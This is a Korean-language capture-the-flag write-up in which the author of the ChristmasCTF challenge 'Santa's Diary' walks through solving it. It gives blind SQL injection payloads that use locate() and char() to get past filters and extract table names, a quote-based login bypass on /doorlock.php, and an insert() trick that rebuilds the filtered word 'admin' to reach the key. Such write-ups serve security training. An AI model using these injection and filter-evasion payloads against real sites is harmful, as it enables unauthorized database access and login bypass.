@@ -1,0 +1,49 @@
+요번 ChristmasCTF 에 출제한 산타의 일기장 문제 풀이를 작성합니다.
+
+먼저 주어진 페이지에 들어가보면 게시판이 하나 존재합니다.
+
+view.php 에서 Blind SQL Injection이 가능합니다.
+
+대부분의 함수들을 필터링하고 있고 싱글쿼터또한 필터링하고 있습니다.
+
+하지만 locate함수와 char함수는 필터링하지 않으므로
+
+
+
+0 or locate(char(97),(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1
+
+0 or locate(char(98),(select table_name from information_schema.tables where table_schema=database() limit 0,1))=2
+
+0 or locate(char(99),(select table_name from information_schema.tables where table_schema=database() limit 0,1))=3
+
+
+
+또는
+
+
+
+0 or locate(concat(char(97),char(98),char(99)),(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1
+
+
+
+등의 쿼리를 통해 테이블명을 알아낼 수 있습니다.
+
+DB를 살피다보면 doorlockdotphp 라는 테이블이 존재하고
+
+guest, admin, test 3개의 계정이 존재합니다.
+
+doorlockdotphp 라는 테이블명을 통해 /doorlock.php 라는 페이지가 존재한다는 것을 유추할 수 있습니다.
+
+해당 페이지에 들어가보면 ID/PW를 입력하는 폼이 하나 존재합니다.
+
+' or 1# 등의 쿼리를 입력해보면 로그인은 성공했지만 어드민이 아니라고 뜹니다.
+
+admin 으로 로그인해야하지만 해당 단어를 필터링하고 있으므로 문자열함수를 통하여 조각을 맞춰줘야합니다.
+
+대부분의 함수들을 필터링하고 있지만 insert 함수를 필터링하지 않으므로
+
+
+
+' or id in(insert('adm,4,6,'in'))# 
+
+쿼리를 통하여 로그인을 시도하면 키값이 나옵니다.
